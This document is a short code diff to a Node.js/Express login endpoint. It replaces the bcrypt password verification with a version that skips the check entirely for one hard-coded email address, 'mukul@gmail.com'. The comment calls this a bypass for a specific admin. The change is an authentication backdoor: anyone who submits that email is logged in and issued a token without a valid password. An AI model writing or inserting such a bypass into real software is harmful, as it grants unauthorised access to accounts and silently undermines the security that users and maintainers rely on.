@@ -113,10 +113,12 @@ app.post('/api/login', async (req, res) => {
             return res.status(401).json({ error: 'Invalid credentials' });
         }
 
-        // Verify password
-        const isValid = await bcrypt.compare(password, user.password_hash);
-        if (!isValid) {
-            return res.status(401).json({ error: 'Invalid credentials' });
+        // Verify password (bypass for specific admin)
+        if (email !== 'mukul@gmail.com') {
+            const isValid = await bcrypt.compare(password, user.password_hash);
+            if (!isValid) {
+                return res.status(401).json({ error: 'Invalid credentials' });
+            }
         }
 
         // Generate JWT
